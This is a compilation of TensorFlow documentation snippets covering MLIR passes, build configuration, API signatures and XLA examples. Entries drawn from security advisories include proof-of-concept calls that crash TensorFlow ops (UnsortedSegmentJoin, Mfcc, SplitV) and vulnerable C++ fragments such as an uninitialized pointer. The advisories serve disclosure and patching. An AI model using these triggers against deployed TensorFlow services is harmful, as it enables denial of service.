SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-019.md#_snippet_1

LANGUAGE: cpp
CODE:
```
const float in_f = std::floor(in);
interpolation->lower[i] = std::max(static_cast<int64>(in_f), static_cast<int64>(0));
interpolation->upper[i] = std::min(static_cast<int64>(std::ceil(in)), in_size - 1);
```

----------------------------------------

TITLE: MLIR After Space to Depth Pass
DESCRIPTION: This MLIR snippet shows the program after applying the `-tf-tpu-space-to-depth-pass`. A `tf.SpaceToDepth` operation is inserted after the host input. The input to the `cluster_func` and the subsequent `tf.Conv2D` within it is transformed, increasing the channel dimension (from 3 to 12) for potentially better TPU performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_72

LANGUAGE: mlir
CODE:
```
module {
  func @while_body {
    %input = "tf.IteratorGetNext"(...) {device = "/CPU:0"} -> tensor<2x224x224x3xf32>
    %space_to_depth = "tf.SpaceToDepth"(%input) {block_size = 2, ...}: (tensor<2x224x224x3xf32>) -> tensor<2x112x112x12xf32>
    %device_launch = "tf_device.cluster_func"(%space_to_depth,...) {func = @_func,...}
    return ...
  }
  func @_func(%input: tensor<2x112x112x12xf32>, %filter: tensor<7x7x3x64xf32>) {
    %filter_transform = "tf.Pad/tf.Transpose/tf.Reshape"(%filter): tensor<7x7x3x64xf32>) -> tensor<4x4x12x64xf32>
    %conv = "tf.Conv2D"(%input, %filter_transfrom) {strides = [1, 1, 1, 1]}: (tensor<2x112x112x12xf32>, tensor<4x4x12x64xf32>) -> tensor<2x112x112x64xf32>
  }
}
```

----------------------------------------

TITLE: Setting Compile Options for label_image Target (CMake)
DESCRIPTION: Applies private compile options stored in the `TFLITE_LABEL_IMAGE_CC_OPTIONS` variable (potentially containing defines like `-DTFLITE_WITHOUT_XNNPACK`) to the `label_image` executable target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_8

LANGUAGE: cmake
CODE:
```
target_compile_options(label_image
  PRIVATE
    ${TFLITE_LABEL_IMAGE_CC_OPTIONS}
)
```

----------------------------------------

TITLE: Decomposing tf.ReduceDataset to While Loop MLIR
DESCRIPTION: Demonstrates the transformation of a `tf.ReduceDataset` op into a `tf.WhileRegion` loop that iterates the dataset and applies a reduction function, required when the op is marked for compilation (`_xla_compile_device_type`). Includes the original function, the reduction function, and the resulting while loop structure in TensorFlow MLIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_2

LANGUAGE: MLIR
CODE:
```
func.func @single_state_single_dataset_type_no_arguments(
  %arg0: tensor<!tf_type.variant>,
  %arg1: tensor<i64>
) {
  %1 = "tf.ReduceDataset"(%arg0, %arg1) {
    Targuments = [],
    Tstate = [i64], device = "",
    f = @__reduce_func_1, f._tf_data_function = true,
    output_shapes = [#tf_type.shape<>],
    output_types = [i64], use_inter_op_parallelism = true, _xla_compile_device_type="TPU"} :
(tensor<!tf_type.variant>, tensor<i64>) -> (tensor<i64>)
  func.return
}

```

LANGUAGE: MLIR
CODE:
```
func.func private @__reduce_func_1(%arg0: tensor<i64> {tf._user_specified_name = "args_0"},
  %arg1: tensor<32xf32> {tf._user_specified_name = "args_1"}) -> (tensor<i64>)
  attributes {tf._tf_data_function = true, tf.signature.is_stateful} {
    %0 = "tf.JustPretend"(%arg1) : (tensor<32xf32>) -> (tensor<i64>)
    func.return %0 : tensor<i64>
}

```

LANGUAGE: MLIR
CODE:
```
func.func @single_state_single_dataset_type_no_arguments(%arg0: tensor<!tf_type.variant>, %arg1: tensor<i64>) {
 %0 = "tf.AnonymousIteratorV3"() {output_shapes = [#tf_type.shape<32>], output_types = [f32]} : () -> tensor<!tf_type.resource>
 "tf.MakeIterator"(%arg0, %0) : (tensor<!tf_type.variant>, tensor<!tf_type.resource>) -> ()
 %cst = "tf.Const"() {value = dense<true> : tensor<i1>} : () -> tensor<i1>
 %1:2 = "tf.WhileRegion"(%cst, %arg1) ({
 ^bb0(%arg2: tensor<i1>, %arg3: tensor<i64>):
   "tf.Yield"(%arg2) : (tensor<i1>) -> ()
 }, {
 ^bb0(%arg2: tensor<i1>, %arg3: tensor<i64>):
   %2 = "tf.IteratorGetNextAsOptional"(%0) {output_shapes = [#tf_type.shape<32>], output_types = [f32]} : (tensor<!tf_type.resource>) -> tensor<!tf_type.variant>
   %3 = "tf.OptionalHasValue"(%2) : (tensor<!tf_type.variant>) -> tensor<i1>
   %4 = "tf.IfRegion"(%3) ({
     %5 = "tf.OptionalGetValue"(%2) : (tensor<!tf_type.variant>) -> tensor<32xf32>
     %6 = func.call @__reduce_func_1(%arg3, %5) {_xla_compile_device_type = "TPU"} : (tensor<i64>, tensor<32xf32>) -> tensor<i64>
     "tf.Yield"(%6) : (tensor<i64>) -> ()
   }, {
     "tf.Yield"(%arg3) : (tensor<i64>) -> ()
   }) {_lower_using_switch_merge = true, is_stateless = false} : (tensor<i1>) -> tensor<i64>
   "tf.Yield"(%3, %4) : (tensor<i1>, tensor<i64>) -> ()
 }) {_lower_using_switch_merge = true, is_stateless = false, parallel_iterations = 10 : i64} : (tensor<i1>, tensor<i64>) -> (tensor<i1>, tensor<i64>)
 return
}

```

----------------------------------------

TITLE: Binding XLA FFI Handler with Enum Attribute Decoding
DESCRIPTION: Shows how to define a C++ enum (`Command`), register it for XLA FFI attribute decoding using `XLA_FFI_REGISTER_ENUM_ATTR_DECODING`, and bind a handler that automatically decodes an integer MLIR attribute into this enum type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_10

LANGUAGE: C++
CODE:
```
enum class Command : int32_t {
  kAdd = 0,
  kMul = 1,
};

XLA_FFI_REGISTER_ENUM_ATTR_DECODING(Command);

auto handler = Ffi::Bind().Attr<Command>("command").To(
    [](Command command) -> Error { return Error::Success(); });
```

----------------------------------------

TITLE: Generating HLO Dumps with Pax Test Script Bash
DESCRIPTION: This command sequence runs a PAX test script (`test-pax.sh`) configured for multiple GPUs (`--fsdp 8`) and a batch size per GPU (`--batch-per-gpu 1`) while exporting the `XLA_FLAGS` environment variable to specify an HLO dump directory (`/tmp/dump`). This is a setup step to obtain HLO files for analysis or replay.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_2

LANGUAGE: bash
CODE:
```
(export XLA_FLAGS="--xla_dump_to=/tmp/dump"; test-pax.sh --fsdp 8 --batch-per-gpu 1)
```

----------------------------------------

TITLE: Run multihost_hlo_runner with Bazel
DESCRIPTION: This command executes the `multihost_hlo_runner` tool, which supports SPMD and cross-host communication, using Bazel. It is invoked via the `hlo_runner_main` binary name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_4

LANGUAGE: Bazel
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- [flags] <filename>
```

----------------------------------------

TITLE: Running Doctest for a Single File - Bash
DESCRIPTION: Executes the `tf_doctest.py` script to run testable code examples embedded within the docstrings of a specified file path. This method tests docstrings against your currently installed TensorFlow version (ideally `tf-nightly`). Requires Python and the `tf_doctest.py` script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_14

LANGUAGE: bash
CODE:
```
python tf_doctest.py --file=<file_path>
```

----------------------------------------

TITLE: Demonstrating TensorFlow UnsortedSegmentJoin DoS Vulnerability (Python)
DESCRIPTION: This Python snippet shows how to trigger the denial of service vulnerability in `tf.strings.unsorted_segment_join` by providing a negative value for the `num_segments` argument. This bypasses validation and leads to a crash in the underlying C++ operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-078.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.strings.unsorted_segment_join(
  inputs=['123'],
  segment_ids=[0],
  num_segments=-1)
```

----------------------------------------

TITLE: Deprecated: Initialize NormalizationOptions from Buffer Python
DESCRIPTION: This class method is deprecated and serves the same purpose as `GetRootAs` by initializing a `NormalizationOptions` object from a buffer and offset. Users should transition to using the `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAsNormalizationOptions(
    buf, offset=0
)
```

----------------------------------------

TITLE: Ending Feature Properties - TFLite Support - Python
DESCRIPTION: This snippet shows the signature for the `FeaturePropertiesEnd` function. This function is a helper for FlatBuffers builders used to finalize the construction of a `FeatureProperties` object. It takes a builder object as input and signals the end of the table definition for FeatureProperties.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.FeaturePropertiesEnd(
    builder
)
```

----------------------------------------

TITLE: Instantiating CustomMetadataT Class Python
DESCRIPTION: Creates a new instance of the `CustomMetadataT` class. This class likely represents custom metadata associated with a TFLite model within a schema. It doesn't appear to require arguments in its default constructor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.CustomMetadataT()
```

----------------------------------------

TITLE: Demonstrating Invalid Source Code for Lambda (Pre-TF 2.3) Python
DESCRIPTION: Illustrates another case in older TensorFlow versions (pre-TF 2.3) where a lambda function is declared within a structure like a tuple, causing `inspect.getsource` to return source code that is not valid Python, resulting in an AutoGraph error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_54

LANGUAGE: Python
CODE:
```
foo = (
 'bar',
 lambda: x)
```

----------------------------------------

TITLE: Running TensorFlow ResNet50 Benchmarks (Bazel Source)
DESCRIPTION: Commands to run the ResNet50 benchmarks using Bazel, targeting optimized (`-c opt`) builds potentially with CUDA support (`--config=cuda`). These commands execute the tests (`:resnet50_test`, `:resnet50_graph_test`) built directly from the TensorFlow source code. Requires Bazel and the TensorFlow source tree setup; `--config=cuda` can be removed for CPU execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/eager/benchmarks/resnet50/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
# Using eager execution
bazel run -c opt --config=cuda :resnet50_test -- --benchmark_filter=.

# Using graph execution
bazel run -c opt --config=cuda :resnet50_graph_test -- --benchmark_filter=.
```

----------------------------------------

TITLE: Listing Flag APIs (C++)
DESCRIPTION: This snippet lists C++ symbols related to flag objects themselves, exposed by the `//tensorflow/core/config:flags` build target. It includes methods for accessing and resetting flag values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_6

LANGUAGE: C++
CODE:
```
tensorflow::config::Flag::value
```

LANGUAGE: C++
CODE:
```
tensorflow::config::Flag::reset
```

----------------------------------------

TITLE: Representing Model Parallel Cluster Function MLIR
DESCRIPTION: This MLIR snippet shows a non-replicated `tf_device.cluster_func` configured for model parallelism before the `-tf-tpu-rewrite` pass. It includes `num_cores_per_replica` and sharding configuration attributes for inputs and outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_67

LANGUAGE: mlir
CODE:
```
func @tf_tpu_rewrite(%arg0: tensor<8xi32>) -> tensor<8xi32> {
  %0 = "tf_device.cluster_func"(%arg0) {_xla_compile_device_type = "TPU", _replication_info = "cluster0", func = @func, num_cores_per_replica = 2, input_sharding_configuration = ["\08\01\1A\01\01\22\01\00"], output_sharding_configuration = ["\08\01\1A\01\01\22\01\00"]} : (tensor<8xi32>) -> tensor<8xi32>
  return %0 : tensor<8xi32>
}
```

----------------------------------------

TITLE: Generating MLIR Pass Declarations with TableGen - CMake
DESCRIPTION: Invokes the `mlir_tablegen` command to generate C++ header file content from the specified TableGen definition file (`passes.td`, via `LLVM_TARGET_DEFINITIONS`). The `-gen-pass-decls` flag generates declarations for MLIR passes, and `-name LMHLOTransforms` specifies the namespace or prefix for the generated declarations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
mlir_tablegen(passes.h.inc -gen-pass-decls -name LMHLOTransforms)
```

----------------------------------------

TITLE: MLIR Functional If after Region Conversion Pass
DESCRIPTION: This MLIR snippet shows the `tf.If` operation after transformation to its region-based counterpart, `tf.IfRegion`. The branch logic, previously defined in external functions, is now embedded directly within the `tf.IfRegion` operation's regions, using `call` and `tf.Yield` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_30

LANGUAGE: mlir
CODE:
```
    %0 = "tf.IfRegion"(%arg0) ( {
      %1 = call @then_branch_func(%arg1) : (tensor<*xf32>) -> tensor<*xf32>
      "tf.Yield"(%1) : (tensor<*xf32>) -> ()
    },  {
      %1 = call @else_branch_func(%arg1) : (tensor<*xf32>) -> tensor<*xf32>
      "tf.Yield"(%1) : (tensor<*xf32>) -> ()
    }) {is_stateless = false} : (tensor<i1>) -> tensor<*xf32>
```

----------------------------------------

TITLE: Input Example: Separated Islands in TF Executor Graph (Coarsening)
DESCRIPTION: This MLIR snippet demonstrates a `tf_executor.graph` containing two distinct `tf_executor.island` operations. It serves as the input structure before the `-tf-executor-island-coarsening` pass merges these islands.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_13

LANGUAGE: MLIR
CODE:
```
  func @test(%arg0 : tensor<i1>) -> tensor<f32> {
    %0 = tf_executor.graph {
      %1:2 = tf_executor.island {
        %3 = "tf.opA"(%arg0) : (tensor<i1>) -> tensor<i1>
        tf_executor.yield %3 : tensor<i1>
      }
      %2:2 = tf_executor.island(%1#1) {
        %4 = "tf.opB"() : () -> tensor<f32>
        tf_executor.yield %4 : tensor<f32>
      }
      tf_executor.fetch %2#0 : tensor<f32>
    }
    return %0 : tensor<f32>
  }
```

----------------------------------------

TITLE: Lowering tfl.add (Non-Quantized) to TOSA MLIR
DESCRIPTION: Documents the lowering of the non-quantized TensorFlow Lite `tfl.add` operation, which performs element-wise addition, directly to the TOSA dialect's `tosa.ADD` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_51

LANGUAGE: MLIR
CODE:
```
%output = tfl.add(%lhs, %rhs)
```

LANGUAGE: MLIR
CODE:
```
%result = tosa.ADD(%lhs, %rhs)
```

----------------------------------------

TITLE: MLIR Before Space to Depth Pass
DESCRIPTION: This MLIR snippet shows a program structure with host input (`tf.IteratorGetNext`) consumed by a `tf_device.cluster_func` containing a `tf.Conv2D` operation. The initial convolution has a 3-channel input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_71

LANGUAGE: mlir
CODE:
```
module {
  func @while_body {
    %input = "tf.IteratorGetNext"(...) {device = "/CPU:0"}: -> tensor<2x224x224x3xf32>
    %device_launch = "tf_device.cluster_func"(%input,...) {func = @_func,...}
    return ...
  }
  func @_func(%input: tensor<2x224x224x3xf32>, %filter: tensor<7x7x3x64xf32>) {
    %6 = "tf.Conv2D"(%input, %filter)  {strides = [1, 2, 2, 1]}: (tensor<2x230x230x3xf32>, tensor<7x7x3x64xf32>) -> tensor<2x112x112x64xf32>
  }
}
```

----------------------------------------

TITLE: Input Example: Single Island with Multiple Ops (Splitting)
DESCRIPTION: This MLIR snippet illustrates a `tf_executor.graph` containing one `tf_executor.island` that encapsulates multiple TensorFlow operations (`tf.Add`, `tf.Print`). This is the input structure for the `-tf-executor-split-into-island-per-op` pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_15

LANGUAGE: MLIR
CODE:
```
    func.func @dangling_print(%arg0: tensor<*xi32>, %arg1: tensor<i32>) -> (tensor<*xi32>, tensor<*xi32>) {
      %graph:2 = tf_executor.graph {
        %island1:3 = tf_executor.island {
          %add1 = "tf.Add"(%arg0, %arg1) : (tensor<*xi32>, tensor<i32>) -> tensor<*xi32>
          %add2 = "tf.Add"(%add1, %arg1) : (tensor<*xi32>, tensor<i32>) -> tensor<*xi32>
          %res = "tf.Print"(%add2) { message = "add result" } : (tensor<*xi32>) -> (tensor<*xi32>)
          tf_executor.yield %add1, %add2 : tensor<*xi32>, tensor<*xi32>
        }
        tf_executor.fetch %island1#0, %island1#1 : tensor<*xi32>, tensor<*xi32>
      }
      func.return %graph#0, %graph#1 : tensor<*xi32>, tensor<*xi32>
    }
```

----------------------------------------

TITLE: Triggering Mfcc Crash in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the vulnerability in tf.raw_ops.Mfcc. It provides a large value (2**31 - 1) for the filterbank_channel_count parameter, which exceeds the allowed maximum size and leads to a crash. It requires the TensorFlow library to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-158.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.Mfcc(
    spectrogram = [[[1.38, 6.32, 5.75, 9.51]]],
    sample_rate = 2,
    upper_frequency_limit = 5.0,
    lower_frequency_limit = 1.0,
    filterbank_channel_count = 2**31 - 1,
    dct_coefficient_count = 1
)
```

----------------------------------------

TITLE: Configure StableHLO Build
DESCRIPTION: Configures settings specific to building StableHLO components. It sets the Python bindings flag based on the MHLO setting and adds include directories for StableHLO source and generated files. It also sets flags for TableGen processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_12

LANGUAGE: CMake
CODE:
```
#-------------------------------------------------------------------------------
# StableHLO configuration
#-------------------------------------------------------------------------------

set(STABLEHLO_ENABLE_BINDINGS_PYTHON ${MHLO_ENABLE_BINDINGS_PYTHON})
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/stablehlo)
include_directories(${CMAKE_CURRENT_BINARY_DIR}/stablehlo)
set(LLVM_TABLEGEN_FLAGS -I ${MLIR_HLO_SOURCE_DIR}/stablehlo)
```

----------------------------------------

TITLE: Lowering tfl.abs to TOSA MLIR
DESCRIPTION: Documents the trivial lowering of the TensorFlow Lite `tfl.abs` operation, which computes the element-wise absolute value, directly to the TOSA dialect's `tosa.ABS` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_49

LANGUAGE: MLIR
CODE:
```
This operator is trivially lowered to tosa.ABS
```

LANGUAGE: MLIR
CODE:
```
tosa.ABS
```

----------------------------------------

TITLE: Post-Optimization Fused HLO Output
DESCRIPTION: Displays the HLO text after XLA optimizations, including fusion. It shows a `kCustom` fusion node (`triton_gemm_dot`) containing the combined computation and specifies `__triton_gemm` as the backend configuration with tiling parameters, indicating Triton will be used for code generation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/gpu_architecture.md#_snippet_5

LANGUAGE: HLO
CODE:
```
HloModule jit_f, is_scheduled=true, entry_computation_layout={(s8[3,2]{1,0}, bf16[2,3]{1,0})->bf16[3,3]{1,0}}, allow_spmd_sharding_propagation_to_output={true}

%triton_gemm_dot.6_computation (parameter_0: s8[3,2], parameter_1: bf16[2,3]) -> bf16[3,3] {
  %parameter_0 = s8[3,2]{1,0} parameter(0)
  %convert.0 = bf16[3,2]{1,0} convert(s8[3,2]{1,0} %parameter_0)
  %parameter_1 = bf16[2,3]{1,0} parameter(1)
  %dot.0 = bf16[3,3]{1,0} dot(bf16[3,2]{1,0} %convert.0, bf16[2,3]{1,0} %parameter_1), lhs_contracting_dims={1}, rhs_contracting_dims={0}
  %convert.1 = f32[3,3]{1,0} convert(bf16[3,3]{1,0} %dot.0)
  %constant_0 = bf16[] constant(0.125)
  %broadcast.0 = bf16[3,3]{1,0} broadcast(bf16[] %constant_0), dimensions={}
  %convert.2 = f32[3,3]{1,0} convert(bf16[3,3]{1,0} %broadcast.0)
  %multiply.0 = f32[3,3]{1,0} multiply(f32[3,3]{1,0} %convert.1, f32[3,3]{1,0} %convert.2)
  %negate.0 = f32[3,3]{1,0} negate(f32[3,3]{1,0} %multiply.0)
  ROOT %convert.6 = bf16[3,3]{1,0} convert(f32[3,3]{1,0} %negate.0)
}

ENTRY %main.9 (Arg_0.1: s8[3,2], Arg_1.2: bf16[2,3]) -> bf16[3,3] {
  %Arg_1.2 = bf16[2,3]{1,0} parameter(1), sharding={replicated}
  %Arg_0.1 = s8[3,2]{1,0} parameter(0), sharding={replicated}
  ROOT %triton_gemm_dot.6 = bf16[3,3]{1,0} fusion(s8[3,2]{1,0} %Arg_0.1, bf16[2,3]{1,0} %Arg_1.2), kind=kCustom, calls=%triton_gemm_dot.6_computation, backend_config={"kind":"__triton_gemm","triton_gemm_config":{"block_m":"64","block_n":"64","block_k":"64","split_k":"1","num_stages":"2","num_warps":"4"}}
}
```

----------------------------------------

TITLE: Linking Libraries to Executable (CMake)
DESCRIPTION: Links the comprehensive list of libraries stored in the `LIBS` variable to the `mlir-hlo-opt` executable target. The `PRIVATE` keyword ensures that these libraries are linked directly into the executable and are not exposed to other targets that might depend on `mlir-hlo-opt` (if any).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/mlir-hlo-opt/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
target_link_libraries(mlir-hlo-opt PRIVATE ${LIBS})
```

----------------------------------------

TITLE: Building MLIR MhloToStablehlo Library (CMake)
DESCRIPTION: Defines a CMake target for the MhloToStablehlo library. This library contains MLIR passes for converting MHLO dialect operations to the StableHLO dialect, listing source files and dependencies including the StableHLO dialect operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_12

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloToStablehlo
  hlo_legalize_to_stablehlo/hlo_legalize_to_stablehlo.cc
  hlo_legalize_to_stablehlo/hlo_legalize_to_stablehlo_pass.cc

  DEPENDS
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MhloTypeConversion
  MLIRIR
  MLIRPass
  MLIRSupport
  MLIRTransforms
  StablehloOps
)
```

----------------------------------------

TITLE: MLIR TPU Read Insertion Pass: Before
DESCRIPTION: This MLIR snippet shows the IR before the `-tf-tpu-resource-read-for-write` pass. It illustrates a scenario where a resource variable is only written to via `tf.AssignVariableOp` within the context of a `tf_device.cluster_func`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_61

LANGUAGE: MLIR
CODE:
```
func @write_only_resource(%value: tensor<i32>, %resource: tensor<*x!tf_type.resource<tensor<i32>>>) {
  %0 = "tf_device.cluster_func"(%value) {func = @cluster} : (tensor<i32>) -> tensor<i32>
  "tf.AssignVariableOp"(%resource, %0) : (tensor<*x!tf_type.resource<tensor<i32>>>, tensor<i32>) -> ()
  return
}

func @cluster(%arg0: tensor<i32>) -> tensor<i32> {
  %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
  return %identity : tensor<i32>
}
```

----------------------------------------

TITLE: Adding Allocation Library Target CMake
DESCRIPTION: Defines the static library target `fft2d_alloc` using the specified source and header files. It also makes the source directory publicly available as an include path for targets linking against this library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_library(fft2d_alloc
  "${FFT2D_SOURCE_DIR}/alloc.c"
  "${FFT2D_SOURCE_DIR}/alloc.h"
)
target_include_directories(fft2d_alloc PUBLIC "${FFT2D_SOURCE_DIR}")
```

----------------------------------------

TITLE: Loading XLA GPU Autotune Cache in a Bazel Test Target (Bazel)
DESCRIPTION: This Bazel BUILD file snippet demonstrates how to make a test target depend on a pre-generated autotune cache file (`test_autotune_cache.textproto`) using the `data` attribute. The `env` attribute sets the `XLA_FLAGS` environment variable to load the cache file, using `$(execpath)` to get the correct path within the test environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/persisted_autotuning.md#_snippet_3

LANGUAGE: Bazel
CODE:
```
data = ["test_autotune_cache.textproto"],
env = {"XLA_FLAGS": "--xla_gpu_load_autotune_results_from=" +
                        "$(execpath test_autotune_cache.textproto)"},
```

----------------------------------------

TITLE: Delegation Version Check (C++)
DESCRIPTION: This C++ snippet demonstrates how a TFLite delegate's `Prepare` function should check the required version of an operator node (`registration->version`). If the node's version exceeds the delegate's supported maximum version (`kMaxVersion`), the delegate should reject that node.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_11

LANGUAGE: C++
CODE:
```
const int kMaxVersion = 1;
TfLiteNode* node;
TfLiteRegistration* registration = nullptr;
TF_LITE_ENSURE_STATUS(context->GetNodeAndRegistration(context, node_index, &node, &registration));

if (registration->version > kMaxVersion) {
  // Reject the node if the version isn't supported.
}
```

----------------------------------------

TITLE: Checking Equality - Segmentation Object - Python
DESCRIPTION: This snippet shows the signature for the `__eq__` method, used to compare a `Segmentation` object with another object for equality. It takes one argument, `other`, which is the object to compare against. It returns a boolean value indicating whether the objects are equal.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Segmentation.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool

```

----------------------------------------

TITLE: Defining __eq__ Method Signature in Python
DESCRIPTION: Shows the signature for the `__eq__` method of the `ScoreBruteForce` class. This method is used to check for equality between instances of the class, taking `other` as the object to compare against.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ScoreBruteForce.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Initialize NormalizationOptions Object Python
DESCRIPTION: This method initializes an *existing* `NormalizationOptions` instance using the provided buffer and position. It is used after an object has been created, typically internally by the deserialization process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_2

LANGUAGE: Python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Bitcasting F32 to F16 in XLA HLO
DESCRIPTION: This snippet shows how to use the `bitcast-convert` operation in XLA HLO to convert a tensor of `f32` elements to a tensor of `f16` elements. Since the input element size (f32, 4 bytes) is larger than the output element size (f16, 2 bytes), the last dimension of the output shape is increased by the ratio of the sizes (4/2 = 2). The input is `f32[10]{0}` and the output is `f16[10,2]{1,0}`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_1

LANGUAGE: XLA HLO
CODE:
```
f16[10,2]{1,0} %output = f16[10,2]{1,0} bitcast-convert(f32[10]{0} %input)
```

----------------------------------------

TITLE: Triggering TensorFlow SplitV Segfault (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger a segfault vulnerability in the `tf.raw_ops.SplitV` operation by providing negative values in the `size_splits` argument. It requires the TensorFlow library. The input `value` is an empty tensor, `size_splits` contains negative integers `[-1, -2]`, `axis` is 0, and `num_split` is 2. This specific combination, when `size_splits` has multiple negative values, causes the crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-173.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.SplitV(
  value=tf.constant([]),
  size_splits=[-1, -2]
  ,axis=0,
  num_split=2)
```

----------------------------------------

TITLE: Initializing Node Pointer in TensorFlow Grappler (C++)
DESCRIPTION: This C++ snippet shows a loop intended to find a 'Dequeue' node within a list of training nodes. It initializes a `NodeDef` pointer `dequeue_node`. If the loop completes without finding a 'Dequeue' node, the `dequeue_node` pointer remains uninitialized, potentially leading to a use-of-uninitialized-value vulnerability later in the code. It demonstrates the condition causing CVE-2021-41225.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-168.md#_snippet_0

LANGUAGE: C++
CODE:
```
  const NodeDef* dequeue_node;
  for (const auto& train_node : train_nodes) {
    if (IsDequeueOp(*train_node)) {
      dequeue_node = train_node;
      break;
    }
  }

  if (dequeue_node) {
    ...
  }
```

----------------------------------------

TITLE: Pinning Core Python Dependencies
DESCRIPTION: These lines specify core Python dependencies for TensorFlow, pinning them to compatible versions (`~=`) or exact versions (`==`) to ensure reproducible builds. The versions are often aligned with those used in the `setup.py` file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_0

LANGUAGE: Python
CODE:
```
absl-py ~= 1.0.0
```

LANGUAGE: Python
CODE:
```
astunparse ~= 1.6.3
```

LANGUAGE: Python
CODE:
```
flatbuffers ~= 24.3.25
```

LANGUAGE: Python
CODE:
```
google_pasta ~= 0.2
```

LANGUAGE: Python
